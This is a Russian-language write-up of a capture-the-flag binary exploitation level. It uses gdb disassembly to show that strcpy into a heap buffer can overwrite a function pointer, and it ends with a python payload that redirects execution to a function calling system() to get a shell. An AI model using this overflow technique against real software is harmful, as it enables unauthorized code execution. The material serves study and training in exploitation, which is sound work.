Посмотрим что вызывается в main

(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>		Здесь у нас малок
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)										
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>		Еще малок
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx				Записываем адрес функции m
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>		strcpy
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax						   вызываем m
   0x080484d2 <+86>:	leave
   0x080484d3 <+87>:	ret
End of assembler dump.

(gdb) info func
All defined functions:

Non-debugging symbols:
---
0x08048454  n		У нас есть еще функция n
0x08048468  m
0x0804847c  main
---

(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:	push   %ebp
   0x08048469 <+1>:	mov    %esp,%ebp
   0x0804846b <+3>:	sub    $0x18,%esp
   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave
   0x0804847b <+19>:	ret
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   %ebp
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>   	Здесь мы можем выйти в терминал
   0x08048466 <+18>:	leave
   0x08048467 <+19>:	ret
End of assembler dump.


Наш план: поставить указатель n вместо указателя m
Как? Воспользовавшись уязвимостью strcpy
Какая уязвимость в strcpy? Переполнение памяти

Ну и переполнив память, записавыемый на стек адрес функции n

Расстояние между малоками - 72
Адрес функции n - 0x08048454

python -c 'print "a"*72 + "\x54\x84\x04\x08"' > /tmp/level6
./level6 $(cat /tmp/level6)